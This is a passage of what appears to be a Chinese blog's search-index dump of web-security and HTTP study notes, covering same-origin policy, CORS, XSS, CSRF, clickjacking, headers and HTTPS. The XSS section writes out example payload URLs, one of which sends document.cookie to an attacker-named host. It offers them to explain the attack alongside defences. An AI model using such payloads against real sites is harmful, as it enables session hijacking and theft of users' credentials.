网站，只有和当前页文档同源的脚本才会被执行在浏览器中，&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;、&lt;link&gt; 等标签都可以加载跨域资源，而不受同源限制XMLHttpRequest 受到同源策略的约束，不能够跨域访问资源，可通过目标域返回的 HTTP 头来授权是否允许跨域访问 1 跨文档通信的限制（相关网站间通信） 设置 document.domain（比较复杂、同时也有安全问题，不推荐使用） 使用 windown.postMessage、window.onmessage 2 XMLHttpRequest 的同源策略老版本的 XMLHttpRequest Level 1，有如下几个缺点： 只支持文本数据的传送，无法用来读取和上传二进制文件。 传送和接收数据时，没有进度信息，只能提存在 没有完成。 受到”同域限制”（Same Origin: Origin Po时，licy），只能向同一域名的服务器请求数据。 新版本的 XMLHttpRequest Level 2，新增了如下几个功能： 可以设置HTTP请求的时限（超时时间） 可以使用 FormData 对象管理表单数据 可以上传文件（二进制数据） 可以请求不同域名下的数据（跨域请求） 可以获取服务器端的二进制数据 可以获得数据传输的进度信息 跨域资源共享（CORS）是针对 XMLHttpRequrest 的意向建设性扩展，用这种方式发送跨域 HTTP 请求时，由于 XMLHttpRequest 受到同源策略的约束，请求结果会被浏览器拦截，当响应头存在 Access-Control-Allow-Origin: Origin 字段时，XMLHttpRequest 才能访问响应结果 3 Web Storeage 的同源策略localStorage 对象实现的是与站点源性相关的持久存储，关闭浏览器之后 localStorage 任然有效，而 sessionStorage 则绑定了当前浏览器窗口，提供的是临时的缓存机制，在浏览回话结束之后被清除掉。 localStorage 的大小大约为 5M，而 Cookie 的单个大小为 4K localStorage 的值类型限定为 string类型，在读取数据时需要进行一些转换 localStorage 在浏览器的隐私模式下面是不可读取的 localStorage 本质上是对字符串的读取，如果存储内容多的话会消耗内存空间，会导致页面变卡 localStorage 不能被爬虫抓取到 4 Cookie 的安全策略Cookie 的出现要早于同源策略，所以两者在某些方面可能会存在一些问题。 网站服务器对 Cookie 提供了两个特殊的可单独设置的标记： httpOnly 和 secure 。 httpOnly 标签可以禁止使用 document.cookle API 来访问页面的 Cookie ，这样即使页面真的被注入了恶意代码，也无法简单地用这个 API 复制出用户的身份信息。 secure 标签使得 Cookie 无法被用在非加密协议的通道里，这样就必须使用 HTTPS 服务所以能防御主动攻击。 当依赖于 HTTP Cookies 做身份认证时： 使用 httpOnly 标签；设计 Web 应用时谨记不要让 Javascript 直接访问到身份授权的 Cookie 信息。需要把敏感 Cookie 的有效范围设呈得越小越好，最好不要指定 Cookie 的 domain 值。 如果应用是完全墓于 HTTPS 的，那 Cookie 就应该标记为 secure ，而且必须时 Cookie 注入有完善的处理（ HTTP 运行环境可能导致标记为 secure 的 Cookie 被覆盖，即使无法被读取）对 Cookie 进行加密签名也许能防范这种超出控制的墓改行为，但也仍然无法阻止受害者的 Cookie 被替换成另一组由合法方式获取的 Cookie 身份。","categories":[{"name":"Web 安全","slug":"Web-安全","permalink":"https://xuxb.github.io/categories/Web-%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web 安全","slug":"web-安全","permalink":"https://xuxb.github.io/tags/web-%E5%AE%89%E5%85%A8/"}]},{"title":"跨域资源共享（CORS）","slug":"Web 安全/跨域资源共享(CORS)","date":"2021-01-14T07:43:00.000Z","updated":"2021-04-30T07:33:43.677Z","comments":true,"path":"2021/01/14/Web 安全/跨域资源共享(CORS)/","link":"","permalink":"https://xuxb.github.io/2021/01/14/Web%20%E5%AE%89%E5%85%A8/%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB(CORS)/","excerpt":"","text":"跨域资源共享（CORS）跨域资源共享（Cross-Origin Resource Sharing） A 网站可以请求 B 网站的图片、字体、CSS文件、javascript文件等，该请求是一个跨域请求，但出于安全考虑，浏览器会限制 javascript 发起的跨域请求，即 XMLHttpRequest 和 Fetch 必须遵循同源策略。 跨域请求分为简单请求和复杂请求 对于简单请求，可将请求直接发送到另一个域的服务器 对于复杂请求，会首先发送一个预检请求到另一个域的服务器（使用 Options 方法），以此来获知服务器是否允许该实际请求 如果预检请求返回结果中，服务器允许了实际请求，即响应头中包含了 Access-Control-Allow-Origin、Access-Control-Allow-Headers 等信息，则再发送一个实际请求 如果预检请求失败，服务器不允许实际请求，如响应报文未包含了正确CORS响应头，那么实际请求会被浏览器拦截，并可在控制台中看到报错信息 所以跨域请求失败的原因，其实是从预检请求中得知另一个域的服务器不支持跨域，而导致真实的请求被浏览器拦截，因此浏览器肯定会发起至少一次跨站请求（简单请求、预检请求或者预检请求 + 复杂请求） javascript 要实现 CORS 需要浏览器和服务器同时支持，（现代浏览器 IE10+） 对于现代浏览器，在发起跨域 ajax 请求时 ，会添加 Origin 字段，表明请求来自哪个源 对于服务器端，须在响应头中添加 Access-Control-Allow-Origin 字段，表示接受某一域名的请求 相比 JSONP ，CORS 更加安全，可靠； JSONP 只能实现 GET 请求，而 CORS 支持所有类型的 HTTP 请求； CORS 比 JSONP 有更好的错误处理，并能携带更多的数据； 123456789101112131415161718GET &#x2F;resources&#x2F;public-data&#x2F; HTTP&#x2F;1.1Host: bar.otherUser-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko&#x2F;20081130 Minefield&#x2F;3.1b3preAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8Accept-Language: en-us,en;q&#x3D;0.5Accept-Encoding: gzip,deflateAccept-Charset: ISO-8859-1,utf-8;q&#x3D;0.7,*;q&#x3D;0.7Connection: keep-aliveReferer: http:&#x2F;&#x2F;foo.example&#x2F;examples&#x2F;access-control&#x2F;simpleXSInvocation.htmlOrigin: http:&#x2F;&#x2F;foo.example&#96;&#96;HTTP&#x2F;1.1 200 OKDate: Mon, 01 Dec 2008 00:23:53 GMTServer: Apache&#x2F;2.0.61 Access-Control-Allow-Origin: *Keep-Alive: timeout&#x3D;2, max&#x3D;100Connection: Keep-AliveTransfer-Encoding: chunkedContent-Type: application&#x2F;xml 某些请求不会触发 CORS 预检请求。本文称这样的请求为“简单请求”，请注意，该术语并不属于 Fetch （其中定义了 CORS）规范。若请求满足所有下述条件，则该请求可视为“简单请求”： 使用下列方法之一： GET HEAD POST Fetch 规范定义了对 CORS 安全的首部字段集合，不得人为设置该集合之外的其他首部字段。该集合为：Accept Accept-Language Content-Language Content-Type DPR Downlink Save-Data Viewport-Width Width Content-Type 的值仅限于下列三者之一：text/plain multipart/form-data application/x-www-form-urlencoded 请求中的任意XMLHttpRequestUpload 对象均没有注册任何事件监听器；XMLHttpRequestUpload 对象可以使用 XMLHttpRequest.upload 属性访问。 请求中没有使用 ReadableStream 对象。","categories":[{"name":"Web 安全","slug":"Web-安全","permalink":"https://xuxb.github.io/categories/Web-%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web 安全","slug":"web-安全","permalink":"https://xuxb.github.io/tags/web-%E5%AE%89%E5%85%A8/"}]},{"title":"HTTP 请求与重定向","slug":"HTTP/HTTP 请求与重定向","date":"2021-01-14T07:42:00.000Z","updated":"2021-04-30T07:19:35.360Z","comments":true,"path":"2021/01/14/HTTP/HTTP 请求与重定向/","link":"","permalink":"https://xuxb.github.io/2021/01/14/HTTP/HTTP%20%E8%AF%B7%E6%B1%82%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/","excerpt":"","text":"HTTP 请求与重定向幂等方法幂等：指无论调用多少次都是相同的作用（对于资源而言） 幂等方法：GET、DELETE、PUT、HEAD 非幂等方法：POST、PATCH HTTP请求方法 方法 作用 安全性 幂等性 GET 查询 是 是 POST 新增 否 否 PUT 更新 否 是 DELETE 删除 否 是 PATCH 局部更新 否 否 在HTTP1.0中，对于301、302的 location 中包含的重定向url，如果请求method不是GET或者HEAD，那么浏览器是禁止自动重定向的，除非得到用户的确认，因为POST、PATCH等请求是非冥等的（也就是再次请求时服务器的资源可能已经发生了变化） 虽然rfc明确了上述的规定，但是很多的浏览器不遵守这条规定，无论原来的请求方法是什么都会自动用GET方法重定向到location指定的url。就是说现存的很多浏览器在遇到POST请求返回301、302状态码的时候自动用GET请求location中的url，无需用户确认。 为了解决这种不规范的问题，HTTP 1.1中新增了303、307状态码，用来明确服务器期待客户端进行何种反应。 303状态码，指客户端可以自动用GET方法重定向请求location中的url，无需用户确认。无论之前是 GET 方式还是 POST 方式。 307状态码，指客户端需要遵守原本301、302的规定，除GET、HEAD方法外，其他的请求方法必须等客户确认才能跳转。 301：（Permanently Moved）永久重定向 302：（Temporarily Moved）临时重定向。标准规定，不允许客户端在重定向时改变请求的方法，但浏览器并未遵循该标准（303/307 为 HTTP/1.1 标准，用于解决 302 的问题） 303：会使用GET方式访问在Location中规定的URI，而无视原先请求的方法 307：对于非GET、HEAD请求，浏览器会自动禁止重定向，除非得到用户确认 302 网址劫持： 指利用域 A 上的一个页引用有高质量更新内容的域 B。这样基于从域B“偷来”的更新内容，这个页面会有较好的排名。并且利用伪装方式，将用户重定向到另一个页面。（主要通过窃取的内容、PR来获取搜索引擎较好的排名） 重定向与转发 请求重定向：客户端行为，相当于两次请求，前一次的请求对象不保存，URL改变 请求转发：服务器端行为，是一次请求，前一次的请求对象保存，URL不改变","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/tags/HTTP/"}]},{"title":"跨站脚本攻击 (XSS)","slug":"Web 安全/跨站脚本攻击(XSS)","date":"2021-01-14T07:42:00.000Z","updated":"2021-04-30T07:51:47.444Z","comments":true,"path":"2021/01/14/Web 安全/跨站脚本攻击(XSS)/","link":"","permalink":"https://xuxb.github.io/2021/01/14/Web%20%E5%AE%89%E5%85%A8/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB(XSS)/","excerpt":"","text":"跨站脚本攻击 (XSS)跨站脚本攻击 XSS (Cross Site Scripts) 说明：攻击者盗取用户的身份信息（如Cookie）、导航到恶意网址、携带木马病毒等 原理：攻击者在网页中嵌入客户端脚本(如JavaScript), 用户浏览网页就会触发恶意脚本执行 1. 反射型XSS步骤 用户正常登录Web应用程序，登录成功会得到一个会话信息的 cookie 攻击者将含有攻击代码的URL发送给被攻击人，例：http://fovweb.com/xss/message.php?send=%3Cscript%3Edocument.write(‘%3Cimg%20height=0%20width=0%20src=%22 http://hacker.fovweb.com/xss/cookie_save.php%3Fcookie=%3D’%20+%20encodeURL(document.cookie)%20+%20’%22/%3E’)%3C/script%3E 用户打开攻击者发送过来的 URL, Web 应用程序执行用户发出的请求，并将请求参数显示在页面中； 请求参数中包含的 JavaScript 代码会被执行，用户的 cookie 信息将会被发送到攻击者； note: 链接中的请求参数会被显示在页面中，如搜索关键字、表单输入框等 链接必须被用户点击才会触发 危害范围小，受害者人数较少 例子：http://health.sohu.com/so/index.shtml?t=news&amp;wd=%E6%84%9F%E5%86%92%27%22onmouseover=%22alert(document.cookie)%22 2. 持久型 XSS 步骤 攻击者向存在漏洞的网站注入恶意代码，如http://a.com/a.jsp?name=xss&lt;script src=http://b.com/b.js&gt;&lt;/script&gt; 用户访问该网站会下载 js 文件，并执行里面的代码 js 可获取用户所有的所有信息（包括Cookie、Session等）并发送给攻击者 note： 攻击者提交的数据会被显示出来，并被所有人看到，如社区评论等 访问存在漏洞的网站就会触发 危害范围大，受害者人数较多 3. 防御措施 在服务器端设置 Cookie 为 http-only，浏览器会禁止 js 访问该 Cookie 输入检查，对用户提交的数据进行校验，对特殊字符进行编码和过滤（主要在后端） 输出检查，对渲染到 html 中的内容进行 htmlEncode（主要在前端） 针对不同的上下文调用不同的转义规则，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致 利用模板引擎，避免内联事件，避免拼接 HTML","categories":[{"name":"Web 安全","slug":"Web-安全","permalink":"https://xuxb.github.io/categories/Web-%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web 安全","slug":"web-安全","permalink":"https://xuxb.github.io/tags/web-%E5%AE%89%E5%85%A8/"}]},{"title":"跨站请求伪造 (CSRF)","slug":"Web 安全/跨站请求伪造(CSRF)","date":"2021-01-14T07:41:00.000Z","updated":"2021-04-30T07:50:22.330Z","comments":true,"path":"2021/01/14/Web 安全/跨站请求伪造(CSRF)/","link":"","permalink":"https://xuxb.github.io/2021/01/14/Web%20%E5%AE%89%E5%85%A8/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0(CSRF)/","excerpt":"","text":"跨站请求伪造 (CSRF)跨站请求伪造 （Cross-Site Request Forgery ，简称为 CRFR/XSRF) 说明：攻击者盗取用户的身份信息，以用户的名义进行恶意操作（数据查询、转账、删除等） 原理：CSRF 攻击是源于 WEB 的隐式身份验证机制（几乎都是使用 Cookie 来识别用户身份以及保存会话状态）。WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的，因为服务器并不知道 Get、Post 请求是从哪个页面发出，而浏览器默认给每个请求添加 Cookie 信息。 note: 同源策略仅仅阻止了第三方站点读取来自其他站点的内容，但是却没有防止这些第三方站点向其他站点发出请求。因为 CSRF 攻击是由于某些请求被发出（而引起在服务器端执行了某些动作）所引起的，所以同源策略只能用来保护第三方站点上的数据的私密性，但是同源策略无法防止 CSRF 攻击。 完成 CSFR 攻击必须有以下两个步骤: 登录受信任网站A，并生成 Cookie 在网站 A Cookie 有效期间，登录危险网站 B 关闭tab页面或浏览器，并不能结束 Session （Cookie 中的 sessionId依然有效，重新登录时会复写） 危险网站B可能是存在漏洞并受到攻击（XSS 攻击）的大型知名网站 **CSFR 防御 **（主要在服务器端完成） 生成随机 Token，提交表单时服务器会进行对比 （推荐） 在后端返回 HTML或用户登录后，将 CSFR 令牌（Token）存放在 Token 中，之后的请求再将 Token 放在请求头 (如 x-csfr-token) 中 (推荐) 表单中添加图片验证码 在每个表单中包含一个伪随机数 检查请求头中的 referer 字段，并不一定会带上该字段（可用户图片防盗链，只允许站内使用） 使用 Same-Site 属性","categories":[{"name":"Web 安全","slug":"Web-安全","permalink":"https://xuxb.github.io/categories/Web-%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web 安全","slug":"web-安全","permalink":"https://xuxb.github.io/tags/web-%E5%AE%89%E5%85%A8/"}]},{"title":"点击劫持","slug":"Web 安全/点击劫持","date":"2021-01-14T07:40:00.000Z","updated":"2021-04-30T07:53:12.298Z","comments":true,"path":"2021/01/14/Web 安全/点击劫持/","link":"","permalink":"https://xuxb.github.io/2021/01/14/Web%20%E5%AE%89%E5%85%A8/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/","excerpt":"","text":"点击劫持点击劫持(UI 覆盖攻击)是攻击者使用一个透明的、不可见的 iframe，覆盖在一个网页上，通过调整 iframe 的位置，诱使用户恰好点击在 iframe 页面的一些功能性按钮上 操作步骤 访问者被恶意网页吸引。此处略过如何被吸引的。 页面上存在一个看起来无害的链接（比如：“马上有钱” 或者 “点我，超好玩！”）。 恶意网页在该链接之上放置一个透明 &lt;iframe&gt; 标签，其中 src 指向 facebook.com，如此一来，“点赞” 按钮恰好在链接上面。通常用 z-index 实现。 如果用户试图点击该链接，实际上是点到了 “点赞” 按钮上。 解决方式在响应头或 meta 标签中使用 X-Frame-Options 可以在响应头中添加，如 X-Frame-Options: DENY 可以在 HTML 的 meta 标签中添加，如 &lt;meta http-equiv=&quot;X-Frame-Options&quot; content=&quot;deny&quot;&gt; X-Frame-Options 有三个值: DENY: 表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。 SAMEORIGIN: 表示该页面可以在相同域名页面的 frame 中展示。 ALLOW-FROM uri: 表示该页面可以在指定来源的 frame 中展示。","categories":[{"name":"Web 安全","slug":"Web-安全","permalink":"https://xuxb.github.io/categories/Web-%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web 安全","slug":"web-安全","permalink":"https://xuxb.github.io/tags/web-%E5%AE%89%E5%85%A8/"}]},{"title":"HTTP 协议","slug":"HTTP/HTTP 协议","date":"2021-01-14T07:39:00.000Z","updated":"2021-04-30T07:19:41.798Z","comments":true,"path":"2021/01/14/HTTP/HTTP 协议/","link":"","permalink":"https://xuxb.github.io/2021/01/14/HTTP/HTTP%20%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"HTTP 协议1、定义HTTP协议即超文本传送协议 (Hypertext Transfer Protocol )，是建立在TCP协议之上的一种应用。HTTP连接最显著的特点是客户端发送的每次请求都需要服务器回送响应，在请求结束后，会主动释放连接。从建立连接到关闭连接的过程称为 “一次连接”。 在HTTP 1.0 中客户端的每次请求都要求建立一次单独的连接，在处理完本次请求后，就自动释放连接。 在HTTP 1.1 中可以在一次连接中处理多个请求，并且多个请求可以重叠进行，不需要等待一个请求结束后再发送下一个请求。 由于 HTTP 在每次请求结束后都会主动释放连接，因此 HTTP 连接是一种”短连接”要保持客户端程序的在线状态，需要不断地向服务器发起连接请求。通常的做法是即时不需要获得任何数据，客户端也保持每隔一段固定的时间向服务器发送一次“保持连接”的请求，服务器在收到该请求后对客户端进行回复，表明知道客户端“在线”。若服务器长时间无法收到客户端的请求，则认为客户端“下线”，若客户端长时间无法收到服务器的回复，则认为网络已经断开。 http报文是在http应用程序之间传递的数据块，这些数据描述了报文的内容和含义，以及数据部分 2、组成报文的组成：起始行、首部、主体 1234567891011121314&#x2F;&#x2F; http 请求报文GET &#x2F;home&#x2F;index.html http&#x2F;1.0 &#x2F;&#x2F;起始行Host: www.abc.com &#x2F;&#x2F;首部Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8 &#x2F;&#x2F;首部&#x2F;&#x2F; http 响应报文HTTP&#x2F;1.0 200 OK &#x2F;&#x2F;起始行Content-type:text&#x2F;plain &#x2F;&#x2F;首部Content-length:19 &#x2F;&#x2F;首部Hi I&#39;m a message! 主体 3、首部头信息 通用首部: 提供报文相关的最基本的信息，可在请求报文、响应报文中使用 Connection: 表示是否需要持久连接 Date: 表示消息发送的时间，服务器响应中要包含这个头部 Cache-Control: 指定请求和响应遵循的缓存机制 Via: 表示从请求到响应经过了哪些代理服务器 请求首部 信息性首部 Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号 Referer：浏览器向WEB 服务器表明自己是从哪个网页URL获得点击当前请求中的网址 Range: 指定第一个字节的位置和最后一个字节的位置 User-Agent：发送操作系统与浏览器的名称与版本号 Accept 首部 Accept：告诉WEB服务器自己接受什么介质类型，/ 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type Accept-Chartset：浏览器告诉服务器自己能接收的字符集 Accept-Encoding：浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate） Accept-Language：浏览器申明自己接收的语言。语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等 条件请求首部 If-Match：如果对象的 ETag 没有改变（对象没有改变），才执行请求的动作，获取文档。 If-None-Macth：如果对象的 ETag 改变了（对象也改变了），才执行请求的动作，获取文档。 If-Modified-Since：如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告诉浏览器该对象没有修改。 If-Unmodified-Since：如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。 安全请求首部 Authorization：当客户端接收到来自WEB服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给WEB服务器 Cookie：由客户端发送，包含在HTTP请求的头部中。注意，只有cookie的domain和path与请求的URL匹配才会发送这个cookie。 代理请求首部 Proxy-Authorization：浏览器响应代理服务器的身份验证请求，提供自己的身份信息。 响应首部 信息性首部 Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了 Server：WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix) Vary：WEB服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB服务器在接到第一个请求消息时，其响应消息的头部为：Content-Encoding: gzip; Vary: Content-Encoding，那么Cache服务器会分析后续请求消息的头部，检查其Accept-Encoding，是否跟先前响应的Vary头部值一致，即是否使用相同的内容编码方法，这样就可以防止Cache服务器用自己Cache里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding。 安全响应首部 Set-Cookie：由服务器发送，它包含在响应请求的头部中。它用于在客户端创建一个Cookie。 Proxy-Authenticate：代理服务器响应浏览器，要求其提供代理身份验证信息。 Access-Control-Allow-Origin：origin 参数的值指定了允许访问该资源的外域 URI（Ajax 跨域资源共享） 实体首部 信息性首部 Allow：服务器支持哪些请求方法（如GET、POST等）。 Location：表示客户应当到哪里去提取文档，用于将接收端定位到资源的位置（URL）上。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302 实体内容首部 Content-Encoding:告知客户端服务器对实体的主体部分选用的内容编码方式。（gzip/compress/deflate/identity) Content-Language:告知客户端，实体主体使用的自然语言。（中文或英文等语言） Content-Length：表明了实体主体部分的大小。 Content-Location:给出与报文主体返回资源对应的URI。 Content-MD5：是一串由MD5算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。 Content-Range:针对范围请求，返回响应时使用的首部字段，能告知客户端作为相应返回的实体的哪个部分符合范围请求。 Content-Type:说明了实体主体内对象的媒体类型，该字段用type/subtype形式赋值。 实体缓存首部 Etag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个html文件，如果被修改了，其Etag也会别修改，所以，ETag的作用跟Last-Modified的作用差不多，主要供WEB服务器判断一个对象是否改变了。比如前一次请求某个html文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得ETag值发送给WEB服务器，然后WEB服务器会把这个ETag跟该文件的当前ETag进行对比，然后就知道这个文件有没有改变了。 Expires：WEB服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB服务器验证了其有效性后，才能用来响应客户请求。是 HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT Last-Modified：WEB服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT 实体编码首部 Accept-Encoding：客户端发送给服务器，表明自己可以接受哪些编码（gzip、compress、deflate、identity） Content-Encoding: 服务器发送给客户端，告诉客户端以哪种方式解码 （gzip、compress、deflate、identity） 4、HTTP 状态码 100 Continue 200 OK 201 Created 请求已经被实现，而且有一个新的资源已经依据请求的需要而建立，且其 URI 已经随Location 头信息返回 (常规使用场景是作为 PUT 请求的返回值) 202 Accepted 服务器已接受请求，但尚未处理 204 No Content（无内容） 206 Partial Content（使用断点续传） 301 Moved Permanently 302 Move Temporarily 304 Not Modified 400 Bad Request（不合规范的请求） 401 Unauthorized（未授权） 403 Forbidden（禁止访问） 404 Not Found（文件找不到） 500 Internal Server Error（内部服务器错误） 503 Service Unavailable（服务不可用） 504 Gateway Timeout 5、Get 与 Post 请求的区别 Get 请求能缓存，Post 不能 Post 相对 Get 安全一点点，因为Get 请求都包含在 URL 里，且会被浏览器保存历史纪录，Post 不会，但是在抓包的情况下都是一样的。 Post 可以通过 request body来传输比 Get 更多的数据，Get 没有这个技术 URL有长度限制，会影响 Get 请求，但是这个长度限制是浏览器规定的，不是 RFC 规定的 Post 支持更多的编码类型且不对数据类型限制","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/tags/HTTP/"}]},{"title":"HTTPS 协议","slug":"HTTP/HTTPS 协议","date":"2021-01-14T07:39:00.000Z","updated":"2021-04-30T07:20:06.353Z","comments":true,"path":"2021/01/14/HTTP/HTTPS 协议/","link":"","permalink":"https://xuxb.github.io/2021/01/14/HTTP/HTTPS%20%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"HTTPS 协议1、背景介绍HTTP的请求过程中，客户端与服务器之间没有任何身份确认的过程，数据全部明文传输，容易遭到黑客攻击 HTTP 的主要风险如下： 窃听风险：黑客可以获知通信内容 篡改风险：黑客可以修改通信内容 冒充风险：黑客可以冒充他人身份参与通信 HTTPS：（Secure Hypertext Transfer Protocol）安全超文本传输协议，它基于 HTTP 开发，用于在客户计算机和服务器之间交换信息。它使用安全套接字层 (SSL) 进行信息交换。 一句话总结 HTTPS的过程：HTTPS 要使客户端与服务器端的通信过程得到安全保证，必须使用的对称加密算法，但是协商对称加密算法的过程，需要使用非对称加密算法来保证安全，然而直接使用非对称加密的过程本身也不安全，会有中间人篡改公钥的可能性，所以客户端与服务器不直接使用公钥，而是使用数字证书签发机构颁发的证书来保证非对称加密过程本身的安全。这样通过这些机制协商出一个对称加密算法，就此双方使用该算法进行加密解密。从而解决了客户端与服务器端之间的通信安全问题。 2、SSLSSL (Secure Sockets Layer 安全套接层)，及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS 与 SSL 在传输层对网络连接进行加密。 SSL协议位于 TCP/I P协议与各种应用层协议之间，为数据通讯提供安全支持。SSL协议可分为两层： SSL记录协议（SSL Record Protocol）：它建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。 SSL握手协议（SSL Handshake Protocol）：它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。 特点： 认证用户和服务器，确保数据发送到正确的客户机和服务器； 加密数据以防止数据中途被窃取； 维护数据的完整性，确保数据在传输过程中不被改变。 3、加密算法3.1 对称加密算法在对称加密算法中，数据发信方将明文（原始数据）和加密密钥一起经过特殊加密算法处理后，使其变成复杂的加密密文发送出去。收信方收到密文后，若想解读原文，则需要使用加密用过的密钥及相同算法的逆算法对密文进行解密，才能使其恢复成可读明文。 在对称加密算法中，使用的密钥只有一个，发收信双方都使用这个密钥对数据进行加密和解密，这就要求解密方事先必须知道加密 密钥 和 加密算法。 特点：加密强度大，难以破解，加密解密速度快 常见的对称加密算法：AES 、RC4 、3DES 3.2 非对称加密算法非对称加密算法需要两个密钥：公开密钥（publickey）和私有密钥（privatekey）。 如果用公开密钥对数据进行加密，只有用对应的私有密钥才能解密； 如果用私有密钥对数据进行加密，那么只有用对应的公开密钥才能解密； 特点：性能较低，但是安全性超强 常见的非对称加密算法：RSA 、DSA/DSS、 DH 、、RSA、DSA、ECDSA、 DH 3.3 Hash 算法说明：将任意长度的信息转换为较短的固定长度的值，通常其长度要比信息小得多，且算法不可逆。 常见的 hash 算法：MD5、SHA-1、SHA-2、SHA-256 结论：非对称算法 强度复杂、安全性依赖于算法与密钥但是由于其 算法复杂，而使得加密解密速度没有对称加密解密的速度快，公钥加密目前只能用来作 密钥交换 或者 内容签名，不适合用来做应用层传输内容的加解密会话密钥客户端在认证完服务器。获得服务器的公钥之后，利用该公钥与服务器进行加密通信，协商出两个会话密钥，分别是用于加密客户端往服务端发送数据的客户端会话密钥，和用于加密服务端往客户端发送数据的服务端会话密钥。在已有服务器公钥，可以加密通讯的前提下，还要协商两个对称密钥的原因，是因为非对称加密相对复杂度更高，在数据传输过程中，使用对称加密，可以节省计算资源。另外，会话密钥是随机生成，每次协商都会有不一样的结果，所以安全性也比较高。 使用场景： 甲方生成一对密钥并将其中的公用密钥公开；得到该公用密钥的乙方使用该密钥对机密信息进行加密后再发送给甲方；甲方再用自己保存的另一把专用密钥对加密后的信息进行解密。 甲方可以使用乙方的公钥对机密信息进行签名后再发送给乙方；乙方再用自己的私匙对数据进行验签。 4、数据加密的方式方式 1：使用对称加密 客户端发送给服务器的数据使用 对称秘钥 加密，服务器使用 对称秘钥 解密 服务器发送给客户端的数据使用 对称秘钥 加密，客户端使用 对称秘钥 解密 缺点：需维护大量的秘钥、秘钥容易泄露 方式 2：使用非对称加密 客户端发送给服务器的数据使用 公钥 加密，服务器使用 私钥 解密 服务器发送给客户端的数据使用 私钥 加密，客户端使用 公钥 解密 缺点：公钥是公开的，服务器发送给客户端的数据的数据容易被截获 方式 3：同时使用对称加密、非对称加密 客户端发送给服务器的 对称加密算法、对称秘钥 使用 公钥 加密 服务器发送给客户端的数据用此 对称加密算法、对称秘钥 加密，对称秘钥 协商完成 客户端发送给服务器的数据使用 协商的对称秘钥 加密，服务器使用 协商的对称秘钥 解密 服务器发送给的客户端数据使用 协商的对称秘钥 加密，客户端使用 协商的对称秘钥 解密 问题：公钥加密（非对称加密）计算量太大，如何减少耗用的时间？解决方法：每一次对话（session），客户端和服务器端都生成一个 对话密钥（双方协商的对称秘钥），用它来加密信息。由于 对话密钥 是对称加密，所以运算速度非常快，而服务器公钥只用于加密 对话密钥 本身，这样就减少了加密运算的消耗时间。 很明显，方式 3 比较合适 HTTP 的数据加密，但依然有 两个 问题： 客户端如何获得公钥 如何确认服务器是真实的而不是黑客 获取公钥的过程并不能保证安全，似乎又得重新进行一次加密的过程（先有鸡还是先有蛋的问题），So what to do… 5、SSL 证书SSL证书，也称为服务器 SSL 证书，是遵守 SSL 协议的一种数字证书，由全球信任的证书颁发机构 (Certificate Authority，简称 CA) 验证服务器身份后颁发。将SSL证书安装在网站服务器上，可实现网站身份验证和数据加密传输双重功能。 SSL 证书能同时解决了 公钥获取 问题和 黑客冒充 问题 每种支持 HTTPS 的浏览器都内置的许多 CA 中心的公钥信息，CA 中心是浏览器开发商信任的授权机构，它为有需要的网站颁发用于验证的服务器公钥，颁发前 CA 